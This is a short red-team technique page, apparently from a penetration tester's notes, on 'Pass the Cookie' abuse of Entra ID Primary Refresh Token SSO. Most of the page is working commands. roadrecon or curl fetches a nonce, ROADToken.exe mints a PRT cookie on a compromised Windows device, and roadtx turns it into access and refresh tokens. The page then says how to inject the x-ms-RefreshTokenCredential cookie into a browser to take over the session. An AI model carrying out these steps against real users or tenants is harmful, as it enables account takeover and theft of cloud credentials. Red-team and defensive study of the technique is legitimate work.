---
title: Pass the Cookie
---

If [[notes/entra/prt|PRT-based SSO]] is configured and you have code execution in user context on a hybrid- or Azure-joined device, you can get a refresh token for that user.

Request a nonce.

=== "[[notes/tools/roadtools]]"
    ~~~ bash
    roadrecon auth --prt-init -t $tenantid
    ~~~

=== "manual"
    ~~~ bash
    curl -sSf "https://login.microsoftonline.com/$tenant_id/oauth2/token" -d grant_type=srv_challenge | jq -r .Nonce
    ~~~

Get a PRT cookie on the Windows device with [[notes/tools/roadtoken]].

~~~ bat
.\ROADToken.exe %nonce%
~~~

Authenticate with the PRT cookie to get an access and refresh token with [[notes/tools/roadtools]].

~~~ bash
roadtx gettoken --prt-cookie $cookie
roadtx describe < ./.roadtools_auth
~~~

Or to get a browser session open [login.microsoftonline.com/login.srf](https://login.microsoftonline.com/login.srf), add the *x-ms-RefreshTokenCredential* cookie for *https://login.microsoftonline.com*, mark it as *HttpOnly* and *Secure*, then visit [login.microsoftonline.com/login.srf](https://login.microsoftonline.com/login.srf) again.

References:

- [PRT abuse from userland with Cobalt Strike](http://web.archive.org/web/20230113152615/https://red.0xbad53c.com/red-team-operations/azure-and-o365/prt-abuse-from-userland-with-cobalt-strike)
- [Abusing Azure AD SSO with the Primary Refresh Token](http://web.archive.org/web/20221226162133/https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
